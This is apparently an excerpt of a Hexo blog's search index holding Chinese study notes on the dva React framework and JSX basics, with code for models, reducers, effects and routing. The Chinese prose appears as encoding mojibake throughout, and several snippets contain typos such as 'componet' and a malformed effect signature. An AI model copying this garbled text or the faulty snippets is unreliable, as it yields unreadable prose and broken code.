&#125;&#125; æ•°æ®æµé—®é¢˜æ•°æ®æµæ–¹æ¡ˆFlux ï¼Œå•é¡¹æ•°æ®æµæ–¹æ¡ˆï¼Œ Redux ä¸ºä»£è¡¨Reactive ,å“åº”å¼æ•°æ®æµæ–¹æ¡ˆ Mobx ä¸ºä»£è¡¨ æµè¡Œçš„æ•°æ®æµæ–¹æ¡ˆè·¯ç”±ï¼š React-Routeræž¶æž„ï¼š Reduxå¼‚æ­¥æ“ä½œï¼š Readux-sagaç¼ºç‚¹ï¼šå¼•å…¥å¤šä¸ªåº“ï¼Œé¡¹ç›®ç»“æž„å¤æ‚ dva æ˜¯ä»€ä¹ˆdva æ˜¯ä½“éªŒæŠ€æœ¯éƒ¨å¼€å‘çš„ React åº”ç”¨æ¡†æž¶ï¼Œå°†ä¸Šé¢ä¸‰ä¸ª React å·¥å…·åº“åŒ…è£…åœ¨ä¸€èµ·ï¼Œç®€åŒ–äº† API ,è®©å¼€å‘ React åº”ç”¨æ›´åŠ å¿«æ·å’Œæ–¹ä¾¿`dva = React-Router + Redux + Readux -saga dva åº”ç”¨çš„æœ€ç®€ç»“æž„1234567891011import dva from &apos;dva&apos;;const App = () =&gt; &lt;div&gt; Hello dva&lt;/div&gt;;//åˆ›å»ºåº”ç”¨const app = dva();//æ³¨å†Œè§†å›¾app.router( () =&gt; &lt;App/&gt;)//å¯åŠ¨åº”ç”¨app.start(&apos;#root&apos;); æ•°æ®æµå›¾State ===(connect)== View ==(dispatch)== Action == State State : ä¸€ä¸ªå¯¹è±¡ï¼Œä¿å­˜è¿™ä¸ªåº”ç”¨çŠ¶æ€View : React ç»„ä»¶æž„æˆçš„è§†å›¾å±‚Action : ä¸€ä¸ªå¯¹è±¡ï¼Œæè¿°äº‹ä»¶connectæ–¹æ³• : ä¸€ä¸ªå‡½æ•°ï¼Œç»‘å®š State åˆ° Viewdispatch æ–¹æ³• : ä¸€ä¸ªå‡½æ•°ï¼Œå‘é€ Action åˆ° State State å’Œ viewState æ˜¯å­˜å‚¨æ•°æ®çš„åœ°æ–¹ï¼Œæ”¶åˆ° Action åŽï¼Œå°±ä¼šæ›´æ–°æ•°æ®View æ˜¯ React ç»„ä»¶æž„æˆçš„ UI å±‚ï¼Œä»Ž State èŽ·å–åˆ°æ•°æ®åŽï¼Œå°±æ¸²æŸ“æˆ HTML ä»£ç ã€‚åªè¦ State æœ‰å˜åŒ–ï¼Œ View å°±ä¼šè‡ªåŠ¨æ›´æ–° ActionAction æ˜¯ç”¨æ¥æè¿° UI å±‚äº‹ä»¶çš„ä¸€ä¸ªå¯¹è±¡ { type:â€™click-submit-buttonâ€™, payload: this.form.data } connect æ–¹æ³•connect æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç»‘å®š State åˆ° View 123456import &#123; connect &#125; from &apos;dva&apos;function mapStateToProps(state) &#123; return &#123; todos: state.todos &#125;;&#125;connect(mapStateToProps)(App); connect æ–¹æ³•è¿”å›žçš„ä¹Ÿæ˜¯ä¸€ä¸ª React ç»„ä»¶ï¼Œé€šå¸¸ç§°ä¸ºå®¹å™¨ç»„ä»¶ï¼Œå› ä¸ºå®ƒæ˜¯åŽŸå§‹çš„ UI ç»„ä»¶çš„å®¹å™¨ï¼Œå³åœ¨å¤–é¢åŒ…äº†ä¸€å±‚ Stateconnect æ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ mapStateToProps å‡½æ•°ï¼Œ mapStateToprops å‡½æ•°ä¼šè¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œç”¨äºŽå»ºç«‹ State åˆ° Props çš„æ˜ å°„å…³ç³» dispatch æ–¹æ³•dispatch æ˜¯ä¸€ä¸ªå‡½æ•°æ–¹æ³•ï¼Œç”¨æ¥å°† Action å‘é€ç»™ State 1dispatch(&#123; type:&apos;click-submit&apos;, payload: this.form.data &#125;) è¢« connect çš„ Component ä¼šè‡ªåŠ¨åœ¨ props ä¸­æ‹¥æœ‰ dispatch æ–¹æ³• dva åº”ç”¨çš„æœ€ç®€ç»“æž„ï¼ˆå¸¦ modelï¼‰1234567891011121314151617181920212223// åˆ›å»ºåº”ç”¨const app = dva();// æ³¨å†Œ Modelapp.model(&#123; namespace: &apos;count&apos;, state: 0, reducers: &#123; add(state) &#123; return state + 1&#125;, &#125;, effects: &#123; *addAfterSecond(action, (call, put))&#123; yield call(delay,1000); yield put(&#123; type: &apos;add&apos;&#125;); &#125; &#125;&#125;);// æ³¨å†Œè§†å›¾app.router( () =&gt; &lt;ConnectedApp /&gt;);// å¯åŠ¨åº”ç”¨app.start(&apos;#root&apos;); app.modeldva æä¾› app.model è¿™ä¸ªå¯¹è±¡ï¼Œæ‰€æœ‰åº”ç”¨é€»è¾‘éƒ½å®šä¹‰åœ¨å®ƒä¸Šé¢ 1234567const app = dva();// æ–°å¢žè¿™ä¸€è¡Œapp.model(&#123; /**/&#125;);app.router( () =&gt; &lt;App/&gt;);app.start(&apos;#root&apos;); Model å¯¹è±¡çš„ä¾‹å­12345678910111213&#123; namespace: &apos;count&apos;, state: 0, reducers: &#123; add(state) &#123; return state + 1 &#125;, &#125;, effects: &#123; *addAfter1Second(action, &#123; call,put &#125;) &#123; yield call(delay,1000); yield put(&#123; type: &apos;add&apos;&#125;); &#125; &#125;&#125; Model å¯¹è±¡çš„å±žæ€§namespace: å½“å‰ Model çš„åç§°ï¼Œæ•´ä¸ªåº”ç”¨çš„ State ï¼Œç”±å¤šä¸ªå°çš„ Model çš„ State ä»¥ namespace ä¸º key åˆæˆstate: è¯¥ Model å½“å‰çš„çŠ¶æ€ã€‚æ•°æ®ä¿å­˜åœ¨è¿™é‡Œï¼Œç›´æŽ¥å†³å®šäº†è§†å›¾å±‚çš„è¾“å‡ºreducers: Action å¤„ç†å™¨ï¼Œå¤„ç†åŒæ­¥åŠ¨ä½œï¼Œç”¨æ¥ç®—å‡ºæœ€æ–°çš„ stateeffects: Action å¤„ç†å™¨ï¼Œå¤„ç†å¼‚æ­¥åŠ¨ä½œ ReducerReducer æ˜¯ Action å¤„ç†å™¨ï¼Œç”¨æ¥å¤„ç†åŒæ­¥æ“ä½œï¼Œå¯ä»¥çœ‹åšæ˜¯ state çš„è®¡ç®—å™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯æ ¹æ® Action ï¼Œä»Žä¸Šä¸€ä¸ª State ç®—å‡ºå½“å‰çš„ Stateä¾‹å­ï¼š 1234567891011121314// count + 1function add(state) &#123; return state + 1; &#125;//å¾€ [] é‡Œæ·»åŠ ä¸€ä¸ªæ–°çš„ todofunction addTodo(state, action)&#123; return [...state, action.payload]; &#125;//å¾€ &#123; todos: [], loading: true &#125; é‡Œæ·»åŠ ä¸€ä¸ªæ–°çš„ todo,å¹¶æ ‡è®° loading ä¸º falsefunction addTodo(state, action)&#123; return &#123; ...state, todos: state.todos.concat(action.payload), loading: false &#125;&#125; EffectAction å¤„ç†å™¨ï¼Œå¤„ç†å¼‚æ­¥åŠ¨ä½œï¼ŒåŸºäºŽ Redux-sga å®žçŽ°ã€‚ Effect æŒ‡çš„æ˜¯å‰¯ä½œç”¨ã€‚æ ¹æ®å‡½æ•°å¼ç¼–ç¨‹ï¼Œè®¡ç®—ä»¥å¤–çš„æ“ä½œéƒ½å±žäºŽ Effect ï¼Œå…¸åž‹çš„å°±æ˜¯ I/O æ“ä½œï¼Œæ•°æ®åº“è¯»å†™ 1234function *addAfter1Second(action. &#123; put, all&#125;) &#123; yield(delay, 1000); yield put(&#123; type: &apos;add&apos;&#125;);&#125; Generator å‡½æ•°Effect æ˜¯ä¸€ä¸ª Generator å‡½æ•°ï¼Œå†…éƒ¨ä½¿ç”¨ yield å…³é”®å­—ï¼Œæ ‡è¯†æ¯ä¸€æ­¥çš„æ“ä½œ ï¼ˆæ— è®ºåŒæ­¥æˆ–è€…æ˜¯å¼‚æ­¥ï¼‰ call å’Œ putdva æä¾›å¤šä¸ª effect å‡½æ•°å†…éƒ¨çš„å¤„ç†å‡½æ•°ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ call å’Œ put æ€»ä¾‹å­12345678910111213141516171819202122232425262728293031app.model(&#123; namespace: &apos;count&apos;; state: &#123; record: 0, current: 0, &#125;, reducers: &#123; add(state) &#123; const newCurrent = state.current + 1; return &#123; ...state, record: newCurrent &gt; state.record ? newCurrent: state.record, current: newCurrent, &#125;; &#125;, minus(state) &#123; return &#123; ...state, current: state.current - 1&#125;; &#125;, &#125;, effects: &#123; *add(action ,&#123; call ,put&#125;)&#123; yield call( delay ,1000); yield put(&#123; type: &apos;minus&apos;&#125;); &#125;, &#125;, subscriptions: &#123; keyboardWatcher(&#123; dispatch &#125;) &#123; key( &apos;âŒ˜+up, ctrl+up&apos;, () =&gt; &#123; dispatch(&#123; type:&apos;add&apos;&#125;)&#125;); &#125; &#125;&#125;)]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dva å­¦ä¹ ç¬”è®° (ä¸Š)]]></title>
    <url>%2F2018-07-06-learn-dva-part1.html</url>
    <content type="text"><![CDATA[dva å­¦ä¹ ç¬”è®°dva å­¦ä¹ ç¬”è®° ä»£ç  å®‰è£… dva-cli npm install dva-cli -g åˆ›å»ºæ–°åº”ç”¨ dva new dva-quickstart è¿™ä¼šåˆ›å»º dva-quickstart ç›®å½•ï¼ŒåŒ…å«é¡¹ç›®åˆå§‹åŒ–ç›®å½•å’Œæ–‡ä»¶ï¼Œå¹¶æä¾›å¼€å‘æœåŠ¡å™¨ï¼Œæž„å»ºè„šæœ¬ï¼Œæ•°æ® mock æœåŠ¡ï¼Œä»£ç†æœåŠ¡å™¨ç­‰åŠŸèƒ½ ç„¶åŽæˆ‘ä»¬ cd è¿›å…¥ dva-quickstart ç›®å½•ï¼Œå¹¶å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼š cd dva-quickstartnpm start ä½¿ç”¨ antdé€šè¿‡ npm å®‰è£… antd å’Œ babel-plugin-import ã€‚babel-plugin-import æ˜¯ç”¨æ¥æŒ‰éœ€åŠ è½½ antd çš„è„šæœ¬å’Œæ ·å¼çš„ npm install antd babel-plugin-import â€“save ç¼–è¾‘ .webpackrcï¼Œä½¿ babel-plugin-import æ’ä»¶ç”Ÿæ•ˆã€‚ 12345&#123;+ "extraBabelPlugins": [+ ["import", &#123; "libraryName": "antd", "libraryDirectory": "es", "style": "css" &#125;]+ ]&#125; å®šä¹‰è·¯ç”±ä»¬è¦å†™ä¸ªåº”ç”¨æ¥å…ˆæ˜¾ç¤ºäº§å“åˆ—è¡¨ã€‚é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯åˆ›å»ºè·¯ç”±ï¼Œè·¯ç”±å¯ä»¥æƒ³è±¡æˆæ˜¯ç»„æˆåº”ç”¨çš„ä¸åŒé¡µé¢ã€‚ æ–°å»º route component routes / Products.js æ·»åŠ è·¯ç”±ä¿¡æ¯åˆ°è·¯ç”±è¡¨ï¼Œç¼–è¾‘ router.js Products.js 12import React from &apos;react&apos;;const Products = (props) =&gt; &lt;h2&gt;List of Products&lt;/h2&gt; export default Products; 1234567891011121314151617`router.js`import React from &apos;react&apos;;import &#123; Router, Route, Switch &#125; from &apos;dva/router&apos;;import IndexPage from &apos;./routes/IndexPage&apos;;import Products from &apos;./routes/Products&apos;;function RouterConfig(&#123; history &#125;) &#123; return ( &lt;Router history=&#123;history&#125;&gt; &lt;Switch&gt; &lt;Route path=&quot;/&quot; exact component=&#123;IndexPage&#125; /&gt; &lt;Route path=&quot;/products&quot; exact component=&#123;Products&#125; /&gt; &lt;/Switch&gt; &lt;/Router&gt; );&#125;export default RouterConfig; ç¼–å†™ UI Componentéšç€åº”ç”¨çš„å‘å±•ï¼Œä½ ä¼šéœ€è¦åœ¨å¤šä¸ªé¡µé¢åˆ†äº« UI å…ƒç´  (æˆ–åœ¨ä¸€ä¸ªé¡µé¢ä½¿ç”¨å¤šæ¬¡)ï¼Œåœ¨ dva é‡Œä½ å¯ä»¥æŠŠè¿™éƒ¨åˆ†æŠ½æˆ component ã€‚ æˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ª ProductList componentï¼Œè¿™æ ·å°±èƒ½åœ¨ä¸åŒçš„åœ°æ–¹æ˜¾ç¤ºäº§å“åˆ—è¡¨äº†ã€‚ æ–°å»º components/ProductList.js æ–‡ä»¶ï¼š 1234567891011121314151617181920212223242526272829303132import React from &apos;react&apos;;import PropTypes from &apos;prop-types&apos;;import &#123; Table, Popconfirm, Button &#125; from &apos;antd&apos;;const ProductList = (&#123; onDelete, products &#125;) =&gt; &#123; const columns = [&#123; title: &apos;Name&apos;, dataIndex: &apos;name&apos;, &#125;, &#123; title: &apos;Actions&apos;, render: (text, record) =&gt; &#123; return ( &lt;Popconfirm title=&quot;Delete?&quot; onConfirm=&#123;() =&gt; onDelete(record.id)&#125;&gt; &lt;Button&gt;Delete&lt;/Button&gt; &lt;/Popconfirm&gt; ); &#125;, &#125;]; return ( &lt;Table dataSource=&#123;products&#125; columns=&#123;columns&#125; /&gt; );&#125;;ProductList.propTypes = &#123; onDelete: PropTypes.func.isRequired, products: PropTypes.array.isRequired,&#125;;export default ProductList; å®šä¹‰ Modelå®Œæˆ UI åŽï¼ŒçŽ°åœ¨å¼€å§‹å¤„ç†æ•°æ®å’Œé€»è¾‘ã€‚ dva é€šè¿‡ model çš„æ¦‚å¿µæŠŠä¸€ä¸ªé¢†åŸŸçš„æ¨¡åž‹ç®¡ç†èµ·æ¥ï¼ŒåŒ…å«åŒæ­¥æ›´æ–° state çš„ reducersï¼Œå¤„ç†å¼‚æ­¥é€»è¾‘çš„ effectsï¼Œè®¢é˜…æ•°æ®æºçš„ subscriptions ã€‚ æ–°å»º model models/products.js ï¼š 123456789export default &#123; namespace: &apos;products&apos;, state: [], reducers: &#123; &apos;delete&apos;(state, &#123; payload: id &#125;) &#123; return state.filter(item =&gt; item.id !== id); &#125;, &#125;,&#125;; è¿™ä¸ª model é‡Œï¼š namespace è¡¨ç¤ºåœ¨å…¨å±€ state ä¸Šçš„ keystate æ˜¯åˆå§‹å€¼ï¼Œåœ¨è¿™é‡Œæ˜¯ç©ºæ•°ç»„reducers ç­‰åŒäºŽ redux é‡Œçš„ reducer æŽ¥æ”¶ actionï¼ŒåŒæ­¥æ›´æ–° stateç„¶åŽåˆ«å¿˜è®°åœ¨ index.js é‡Œè½½å…¥ä»–ï¼š connect èµ·æ¥è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»å•ç‹¬å®Œæˆäº† model å’Œ componentï¼Œé‚£ä¹ˆä»–ä»¬å¦‚ä½•ä¸²è”èµ·æ¥å‘¢? dva æä¾›äº† connect æ–¹æ³•ã€‚å¦‚æžœä½ ç†Ÿæ‚‰ reduxï¼Œè¿™ä¸ª connect å°±æ˜¯ react-redux çš„ connect ã€‚ ç¼–è¾‘ routes/Products.jsï¼Œæ›¿æ¢ä¸ºä»¥ä¸‹å†…å®¹ï¼š 1234567891011121314151617181920212223import React from &apos;react&apos;;import &#123; connect &#125; from &apos;dva&apos;;import ProductList from &apos;../components/ProductList&apos;;const Products = (&#123; dispatch, products &#125;) =&gt; &#123; function handleDelete(id) &#123; dispatch(&#123; type: &apos;products/delete&apos;, payload: id, &#125;); &#125; return ( &lt;div&gt; &lt;h2&gt;List of Products&lt;/h2&gt; &lt;ProductList onDelete=&#123;handleDelete&#125; products=&#123;products&#125; /&gt; &lt;/div&gt; );&#125;;// export default Products;export default connect((&#123; products &#125;) =&gt; (&#123; products,&#125;))(Products); æœ€åŽï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€äº›åˆå§‹æ•°æ®è®©è¿™ä¸ªåº”ç”¨ run èµ·æ¥ã€‚ç¼–è¾‘ index.jsï¼š 123456789- const app = dva();+ const app = dva(&#123;+ initialState: &#123;+ products: [+ &#123; name: &apos;dva&apos;, id: 1 &#125;,+ &#123; name: &apos;antd&apos;, id: 2 &#125;,+ ],+ &#125;,+ &#125;); Dva æ¦‚å¿µæ•°æ®çš„æ”¹å˜å‘ç”Ÿé€šå¸¸æ˜¯é€šè¿‡ç”¨æˆ·äº¤äº’è¡Œä¸ºæˆ–è€…æµè§ˆå™¨è¡Œä¸ºï¼ˆå¦‚è·¯ç”±è·³è½¬ç­‰ï¼‰è§¦å‘çš„ï¼Œå½“æ­¤ç±»è¡Œä¸ºä¼šæ”¹å˜æ•°æ®çš„æ—¶å€™å¯ä»¥é€šè¿‡ dispath å‘èµ·ä¸€ä¸ª action ï¼Œå¦‚æžœæ˜¯åŒæ­¥è¡Œä¸ºå°±ä¼šç›´æŽ¥é€šè¿‡ Reducers æ”¹å˜ state ,å¦‚æžœæ˜¯å¼‚æ­¥è¡Œä¸ºï¼ˆå‰¯ä½œç”¨ï¼‰ä¼šå…ˆè§¦å‘ Effects ç„¶åŽæµå‘ Reducers æœ€ç»ˆæ”¹å˜ State ï¼Œæ‰€ä»¥åœ¨ dva ä¸­ï¼Œæ•°æ®æµå‘éžå¸¸æ¸…æ™°ç®€æ˜Žï¼Œå¹¶ä¸”æ€è·¯åŸºæœ¬è·Ÿå¼€æºç¤¾åŒºä¿æŒä¸€è‡´ ModelsState type State = any State è¡¨ç¤º Model çš„çŠ¶æ€æ•°æ®ï¼Œé€šå¸¸è¡¨çŽ°ä¸ºä¸€ä¸ª javascript å¯¹è±¡ï¼ˆå¯ä»¥ä¸ºä»»ä½•å€¼ï¼‰ï¼Œæ“ä½œçš„æ—¶å€™æ¯æ¬¡éƒ½è¦å½“ä½œä¸å¯å˜æ•°æ®æ¥å¯¹å¾…ï¼Œä¿è¯æ¯æ¬¡éƒ½æ˜¯å…¨æ–°å¯¹è±¡ï¼Œæ²¡æœ‰å¼•ç”¨å…³ç³»ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯ State çš„ç‹¬ç«‹æ€§ï¼Œä¾¿äºŽæµ‹è¯•å’Œè¿½è¸ªå˜åŒ– åœ¨ dva ä¸­å¯ä»¥é€šè¿‡ dva çš„å®žä¾‹å±žæ€§ _store çœ‹åˆ°é¡¶éƒ¨çš„ state æ•°æ®ï¼Œä½†æ˜¯é€šå¸¸ä¼šå¾ˆå°‘ç”¨åˆ° const app = dva();console.log(app._store); // é¡¶éƒ¨çš„ state æ•°æ® Action type AsyncAction = any Action æ˜¯ä¸€ä¸ªæ™®é€š javascript å¯¹è±¡ï¼Œå®ƒæ˜¯æ”¹å˜ State çš„å”¯ä¸€é€”å¾„ã€‚æ— è®ºæ˜¯ä»Ž UI äº‹ä»¶ã€ç½‘ç»œå›žè°ƒè¿˜æ˜¯ WebSocket ç­‰æ•°æ®æºèŽ·å¾—çš„æ•°æ®ï¼Œæœ€ç»ˆéƒ½ä¼šé€šè¿‡ dispatch å‡½æ•°è°ƒç”¨ä¸€ä¸ª action,ä»Žè€Œæ”¹å˜å¯¹åº”çš„æ•°æ®ã€‚ action å¿…é¡»å¸¦æœ‰ type å±žæ€§æŒ‡æ˜Žå…·ä½“çš„è¡Œä¸ºï¼Œå…¶ä»–å­—æ®µå¯ä»¥è‡ªå®šä¹‰ï¼Œå¦‚æžœè¦å‘èµ·ä¸€ä¸ª action éœ€è¦ä½¿ç”¨ dispatch å‡½æ•°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ dispatch æ˜¯åœ¨ç»„ä»¶ connect Models åŽï¼Œé€šè¿‡ props ä¼ å…¥çš„ dispatch({ type : â€˜addâ€™ }) dispatch å‡½æ•° type dispatch = (a : Action) =&gt; Action dispatching function æ˜¯ä¸€ä¸ªç”¨äºŽè§¦å‘ action çš„å‡½æ•°ï¼Œ action æ˜¯æ”¹å˜ State çš„å”¯ä¸€é€”å¾„ï¼Œä½†æ˜¯å®ƒåªæè¿°äº†ä¸€ä¸ªè¡Œä¸ºï¼Œè€Œ dispatch å¯ä»¥çœ‹åšæ˜¯è§¦å‘è¿™ä¸ªè¡Œä¸ºçš„æ–¹å¼ï¼Œè€Œ Reducer åˆ™æ˜¯æè¿°å¦‚ä½•æ”¹å˜æ•°æ®çš„ åœ¨ dva ä¸­ã€‚ connect Models çš„ç»„ä»¶é€šè¿‡ props å¯ä»¥è®¿é—®åˆ° dispatch ï¼Œå¯ä»¥è°ƒç”¨ Model ä¸­çš„ Reducer æˆ–è€… Effect ï¼Œå¸¸è§çš„å½¢å¼å¦‚ä¸‹ dispatch({ type : â€˜user/addâ€™, payload : {} //éœ€è¦ä¼ é€’çš„ä¿¡æ¯ }) //å¦‚æžœåœ¨ model å¤–è°ƒç”¨ï¼Œéœ€è¦æ·»åŠ  namespace Reducer type Reducer&lt;S, A&gt; = (state: S, action: A) =&gt; S Reducer ä¹Ÿç§°ä¸º reducing function å‡½æ•°æŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼šä¹‹å‰å·²ç»ç§¯ç´¯è¿ç®—çš„ç»“æžœå’Œå½“å‰è¦è¢«ç§¯ç´¯çš„å€¼ï¼Œè¿”å›žçš„æ˜¯ä¸€ä¸ªæ–°çš„ç§¯ç´¯çš„ç»“æžœã€‚è¯¥å‡½æ•°æŠŠä¸€ä¸ªé›†åˆå½’å¹¶æˆä¸€ä¸ªå•å€¼ã€‚ Reducer çš„æ¦‚å¿µæ¥è‡ªæ˜¯å‡½æ•°å¼ç¼–ç¨‹ï¼Œå¾ˆå¤šè¯­è¨€ä¸­éƒ½æœ‰ reduce API 12345[&#123;x:1&#125;,&#123;y:2&#125;,&#123;z:3&#125;].reduce(function(prev, next)&#123; return Object.assign(prev, next);&#125;)//return &#123;x:1, y:2, z:3&#125; åœ¨ dva ä¸­ï¼Œ reducers èšåˆç§¯ç´¯çš„ç»“æžœæ—¶é—´å½“å‰ model çš„ state å¯¹è±¡ã€‚é€šè¿‡ actions ä¸­ä¼ å…¥çš„å€¼ï¼Œä¸Žå½“å‰ reducers ä¸­çš„å€¼è¿›è¡Œè¿ç®—èŽ·å¾—æ–°çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯æ–°çš„ stateï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ Reducer å¿…é¡»æ˜¯çº¯å‡½æ•°ï¼Œæ‰€ä»¥åŒæ ·è¾“å…¥å¿…ç„¶å¾—åˆ°åŒæ ·çš„è¾“å‡ºï¼Œå®ƒä»¬ä¸åº”è¯¥äº§ç”Ÿä»»ä½•å‰¯ä½œç”¨ã€‚å¹¶ä¸”ï¼Œ æ¯ä¸€æ¬¡è®¡ç®—éƒ½åº”è¯¥ä½¿ç”¨ immutable date,è¿™ç§ç‰¹å¾ç®€å•ç†è§£å°±æ˜¯æ¯æ¬¡æ“ä½œéƒ½æ˜¯è¿”å›žä¸€ä¸ªå…¨æ–°çš„æ•°æ®ï¼ˆç‹¬ç«‹ã€çº¯å‡€ï¼‰ï¼Œæ‰€ä»¥çƒ­é‡è½½å’Œæ—¶é—´æ—…è¡Œè¿™äº›åŠŸèƒ½æ‰èƒ½å¤Ÿä½¿ç”¨ EffectEffect è¢«ç§°ä¸ºå‰¯ä½œç”¨ï¼Œåœ¨æˆ‘ä»¬çš„åº”ç”¨ä¸­ï¼Œæœ€å¸¸è§çš„å°±æ˜¯å¼‚æ­¥æ“ä½œï¼Œå®ƒæ¥è‡ªäºŽå‡½æ•°ç¼–ç¨‹çš„æ¦‚å¿µï¼Œä¹‹æ‰€ä»¥å«å‰¯ä½œç”¨çš„åŽŸå› æ˜¯å®ƒä½¿å¾—æˆ‘ä»¬çš„å‡½æ•°å˜å¾—ä¸çº¯ï¼ŒåŒæ ·çš„è¾“å…¥ä¸ä¸€å®šæ˜¯åŒæ ·çš„è¾“å‡º dva ä¸ºäº†æŽ§åˆ¶å‰¯ä½œç”¨çš„æ“ä½œï¼Œåº•å±‚å¼•å…¥äº† redux-sagas åšå¼‚æ­¥æµç¨‹æŽ§åˆ¶ï¼Œç”±äºŽé‡‡ç”¨äº† generator çš„ç›¸å…³æ¦‚å¿µï¼Œæ‰€ä»¥å°†å¼‚æ­¥è½¬æˆåŒæ­¥å†™æ³•ï¼Œä»Žè€Œå°† effect è½¬ä¸ºäº†çº¯å‡½æ•°ã€‚ SubscirptionSubscription æ˜¯ä¸€ç§ä»ŽæºèŽ·å–æ•°æ®çš„æ–¹æ³•ï¼Œå®ƒæ¥è‡ªäºŽ elm Subscription è¯­ä¹‰æ˜¯è®¢é˜…ï¼Œç”¨äºŽè®¢é˜…ä¸€ä¸ªæ•°æ®æºï¼Œç„¶åŽæ ¹æ®æ¡ä»¶ dispatch éœ€è¦çš„ action ã€‚æ•°æ®æºå¯ä»¥å½“å‰çš„ä¸–ç•Œï¼ŒæœåŠ¡å™¨çš„ websocket è¿žæŽ¥ï¼Œ keyboard è¾“å…¥ï¼Œgeolocation å˜åŒ–ï¼Œhistory è·¯ç”±å˜åŒ–ç­‰ç­‰ 123456789import key from &apos;keymaster&apos;;app.model(&#123; namespace:&apos;count&apos;, subscriptions:&#123; keyEvent(&#123;dispatch&#125;)&#123; key(&apos;âŒ˜+up, ctrl+up&apos;, () =&gt; &#123; dispatch(&#123;type:&apos;add&apos;&#125;) &#125;) &#125; &#125;&#125;) Routerè¿™é‡Œçš„è·¯ç”±æ˜¯æŒ‡å‰ç«¯è·¯ç”±ï¼Œç”±äºŽæˆ‘ä»¬çš„åº”ç”¨é€šå¸¸æ˜¯å•é¡µåº”ç”¨ï¼Œæ‰€ä»¥éœ€è¦å‰ç«¯ä»£ç æ¥æŽ§åˆ¶è·¯ç”±é€»è¾‘ï¼Œé€šè¿‡æµè§ˆå™¨æä¾›çš„ History Api å¯ä»¥ç›‘å¬åˆ°æµè§ˆå™¨ url çš„å˜åŒ–ï¼Œä»Žè€ŒæŽ§åˆ¶è·¯ç”±ç›¸å…³æ“ä½œ dva å®žä¾‹æä¾›äº† router æ–¹æ³•æ¥æŽ§åˆ¶è·¯ç”±ï¼Œä½¿ç”¨çš„æ˜¯ react-router 123456import &#123; Router, Route &#125; from &apos;dva/router&apos;;app.router( (&#123;history&#125;) =&gt; &lt;Router history = &#123;history&#125;&gt; &lt;Route path=&quot;/&quot; componet = &#123;HomePage&#125;&gt; &lt;/Router&gt; ); Router ComponentsContainer Components åœ¨ dva ä¸­æˆ‘ä»¬é€šå¸¸å°†å…¶çº¦æŸä¸º Route Component ,å› ä¸ºåœ¨ dva ä¸­æ˜¯ä»¥ä¹Ÿé¡µé¢ç»´åº¦æ¥è®¾è®¡ Components dva ä¸­ï¼Œé€šå¸¸éœ€è¦ connect Model çš„ç»„ä»¶éƒ½æ˜¯ Route Components,ç»„ç»‡åœ¨ /routers/ ç›®å½•ä¸‹ï¼Œè€Œ /compoents/ ç›®å½•ä¸‹çš„åˆ™æ˜¯çº¯ç»„ä»¶]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React é«˜çº§æŒ‡å¼• D1]]></title>
    <url>%2F2018-07-05-HIgherReact-day01.html</url>
    <content type="text"><![CDATA[React é«˜çº§æŒ‡å¼•å­¦ä¹ ç¬”è®°-ç¬¬ä¸€å¤©æ·±å…¥ JSXåœ¨æœ¬è´¨ä¸Šè®²ï¼Œ JSX åªæ˜¯ä¸º React.createElement(component,props,...children) æ–¹æ³•æä¾›çš„ä¸Žè¯­æ³•ç³– 1&lt;MyButton color=&quot;blue&quot; shadowSize = &#123;2&#125;&gt; Click Me &lt;/MyButton&gt; ç¼–è¯‘ä¸ºï¼š 1React.createElement( MyButton , &#123; color : &apos;blue&apos; , shadowSize : 2&#125; , &apos;Click Me&apos; ); å¦‚æžœæ²¡æœ‰å­ä»£ï¼Œå¯ä»¥ç”¨é—­åˆæ ‡ç­¾ 1&lt;div className = &apos;sidebar&apos; /&gt; ç¼–è¯‘ä¸ºï¼š 1React.createElement( &apos;div&apos; , &#123; className : &apos;sidebar&apos; &#125; , null); æŒ‡å®š React å…ƒç´ ç±»åž‹JSX çš„æ ‡ç­¾åå†³å®šäº† React å…ƒç´ çš„ç±»åž‹å¤§å†™å¼€å¤´çš„ JSX æ ‡ç­¾æ ‡ç¤ºä¸€ä¸ª React ç»„ä»¶ï¼Œè¿™äº›æ ‡ç­¾ä¼šè¢«ç¼–è¯‘ä¸ºåŒåå˜é‡å¹¶è¢«å¼•ç”¨ï¼Œæ‰€ä»¥å¦‚æžœä½¿ç”¨äº† &lt;Foo/&gt; è¡¨è¾¾å¼ï¼Œå°±å¿…é¡»åœ¨ä½œç”¨åŸŸå…ˆå£°æ˜Ž Foo å˜é‡ React å¿…é¡»å£°æ˜Žç”±äºŽ JSX ç¼–è¯‘åŽä¼šè°ƒç”¨ React.createElement æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ JSX ä»£ç ä¸­å¿…é¡»é¦–å…ˆå£°æ˜Ž React å˜é‡ä¸‹é¢çš„å¯¼å…¥éƒ½æ˜¯å¿…é¡»çš„ï¼Œå°½ç®¡åœ¨ä»£ç ä¸­æ²¡æœ‰ç›´æŽ¥å¼•ç”¨ 12345import React from &apos;react&apos;;import CustomButton from &apos;./CustomButton&apos;;function WarningButton()&#123; return &lt;CustomButton color = &quot;red&quot;&gt;&#125; å¦‚æžœä½¿ç”¨ &lt;script&gt; åŠ è½½ React ï¼Œå°†ä½œç”¨äºŽå…¨å±€ ç‚¹è¡¨ç¤ºæ³•ä½¿ç”¨ JSX ä¸­çš„ç‚¹æ¥å¼•ç”¨ React 